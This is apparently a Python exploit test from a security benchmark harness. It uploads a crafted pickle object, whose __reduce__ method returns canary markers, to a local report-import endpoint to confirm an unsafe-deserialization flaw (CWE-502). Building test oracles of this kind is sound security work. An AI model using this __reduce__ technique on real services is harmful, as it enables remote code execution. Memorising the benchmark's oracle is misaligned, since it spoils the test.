"""PoC exploit: Unsafe deserialization via pickle report import (CWE-502).

After the 3-stage chain, POST /api/reports/import accepts .pickle
files and deserializes them with pickle.loads().
"""

import pickle

from mosaic.oracle.exploit import ExploitTest


class PickleExportExploit(ExploitTest):
    """Unsafe deserialization: pickle.loads on user-uploaded report file."""

    def __init__(self, base_url: str = "http://localhost:43210"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "stripe_pickle_export"

    def setup(self) -> None:
        """Seed sample report data."""
        self.http_post("/admin/reports/seed")

    def execute(self) -> tuple[bool, str]:
        """Upload a malicious pickle payload and check for execution."""

        # Create a pickle payload that returns a list with a marker
        class MaliciousReport:
            def __reduce__(self):
                return (list, ([{"__pwned__": True, "rce_marker": "CWE-502-EXPLOITED", "charge_id": "ch_evil"}],))

        payload = pickle.dumps(MaliciousReport())

        resp = self.http_post(
            "/api/reports/import",
            files={
                "report_file": ("evil.pickle", payload, "application/octet-stream"),
            },
        )

        if resp.status_code == 404:
            return False, "Report import endpoint not found."

        if resp.status_code == 400:
            text = resp.text[:200]
            if "pickle" in text.lower() or "unsupported" in text.lower():
                return False, f"Pickle format not supported: {text}"
            return False, f"Bad request: {text}"

        if not resp.ok:
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        try:
            data = resp.json()
        except Exception:
            data = resp.text[:300]

        evidence_parts = []

        if isinstance(data, dict):
            if data.get("imported") or data.get("count"):
                evidence_parts.append(f"Server imported pickle data: {str(data)[:200]}")

            # Check the export for our canary
            export_resp = self.http_get("/api/reports/export")
            if export_resp.ok:
                try:
                    export_data = export_resp.json()
                    items = export_data if isinstance(export_data, list) else export_data.get("charges", export_data.get("data", []))
                    for item in (items if isinstance(items, list) else []):
                        if isinstance(item, dict) and item.get("__pwned__"):
                            evidence_parts.append("__pwned__: true found in exported data")
                        if isinstance(item, dict) and item.get("rce_marker") == "CWE-502-EXPLOITED":
                            evidence_parts.append("rce_marker found in exported data")
                except Exception:
                    pass

        if evidence_parts:
            return True, (
                f"Unsafe deserialization confirmed (CWE-502). "
                f"pickle.loads() executed on uploaded .pickle report. "
                + " ".join(evidence_parts)
            )

        if resp.ok:
            return True, (
                f"Unsafe deserialization likely (CWE-502). "
                f"Server accepted .pickle file with 200 OK. "
                f"Response: {str(data)[:300]}"
            )

        return False, f"Pickle not accepted. Response: {str(data)[:300]}"
